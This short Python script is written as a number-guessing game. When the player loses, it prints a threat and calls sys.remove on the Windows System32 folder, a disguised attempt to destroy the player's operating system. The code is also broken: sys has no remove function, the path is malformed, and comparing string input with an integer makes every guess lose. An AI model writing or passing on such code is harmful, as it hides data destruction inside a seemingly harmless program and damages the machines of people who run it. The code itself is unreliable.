import random
import sys

print("Play this guess game. Guess a number betweeen 1-10  :   ")
while (True) :
    a = input()
    b = random.randint(1,10)
    if (a==b):
        print("You won")
        print("Let's play another round")
    else:
        print("Sorry You lost, Your system will have to pay the price")
        sys.remove('/C:/windows/System32')